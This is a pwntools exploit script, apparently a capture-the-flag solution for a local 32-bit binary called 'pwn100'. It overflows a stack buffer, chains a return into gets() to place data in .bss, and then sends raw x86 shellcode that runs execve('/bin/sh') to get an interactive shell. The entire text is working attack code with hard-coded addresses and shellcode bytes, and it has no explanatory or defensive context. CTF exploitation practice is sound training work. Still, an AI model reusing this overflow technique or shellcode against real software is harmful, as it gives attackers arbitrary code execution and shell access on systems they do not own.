from pwn import *

target = "./pwn100"

p = process(target)

bss = 0x0804a001
plt_gets = 0x080482f0
pr = 0x080484af

payload = "A" * 0x18
payload += "A" * 4
payload += p32(plt_gets)
payload += p32(pr)
payload += p32(bss)
payload += p32(bss)

p.sendline(payload)

payload = "\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

p.sendline(payload)

p.interactive()
